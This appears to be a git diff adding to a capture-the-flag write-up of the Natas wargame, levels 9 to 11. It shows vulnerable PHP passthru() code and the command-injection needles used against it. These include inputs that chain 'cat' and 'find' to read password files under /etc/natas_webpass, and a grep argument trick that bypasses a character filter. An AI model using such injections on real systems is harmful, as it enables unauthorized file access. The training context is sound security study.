@@ -348,7 +348,7 @@ Don't use `include($_GET['page']);` in `index.php` without proper validation!
 - **Date**: 2026-03-07
 - **URL**: `http://natas8.natas.labs.overthewire.org`
 - **Password**: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `PHP`
 
 #### The Solution
 
@@ -417,10 +417,142 @@ Don't put the encoded secret and its encode function in your source code!
 
 ### Level 9
 
-- **Date**: 2026-03-07
+- **Date**: 2026-03-14
 - **URL**: `http://natas9.natas.labs.overthewire.org`
 - **Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `find`, `cat`
 
 #### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+```
+
+Notice that the `$key` variable is being passed to the `grep` command <u>without any sanitization</u>!
+
+So we can use **command injection** to read the password file.
+
+With `test; cat` as the needle, the command becomes `grep -i test; cat dictionary.txt`.
+Try this and you will see the contents of `dictionary.txt`!
+
+Now let's try to find a 'password' file in the system with `test ; find / -name "*natas10*" 2>/dev/null ; cat`.
+And we find a `/etc/natas_webpass/natas10` file!
+
+Let's read it with `test ; cat /etc/natas_webpass/natas10`!
+
+And we get `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.
+
+#### The Lesson
+
+Don't pass user input to system commands without <u>proper sanitization</u>!
+
+### Level 10
+
+- **Date**: 2026-03-14
+- **URL**: `http://natas10.natas.labs.overthewire.org`
+- **Password**: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
+- **Tools**: Web Browser, `grep`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+So they learned from the previous level and added some filtering.
+
+Let's check out that source code (URL/index-source.html):
+```php
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+They have blocked the `;`, `|` and `&` characters.
+But they forgot that `grep` can read multiple files!
+
+We do need to match the password in order to get the contents of `/etc/natas_webpass/natas11`.
+`grep` supports regex, so we can use `.*` to match all characters!
+
+So try `.* /etc/natas_webpass/natas11 #` as the needle and you will see the contents of `/etc/natas_webpass/natas11`!
+`#` just comments out `dictionary.txt` so it's not included in the output.
+
+And you will get `/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk` in the output.
+
+#### The Lesson
+
+- `grep` can read multiple files!
+- Don't rely on blacklisting certain characters for security!
+
+## Levels 11 - 20
+
+### Level 11
+
+- **Date**: 2026-03-14
+- **URL**: `http://natas11.natas.labs.overthewire.org`
+- **Password**: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
+- **Tools**: Web Browser, `PHP`
+
+#### The Solution
+
 
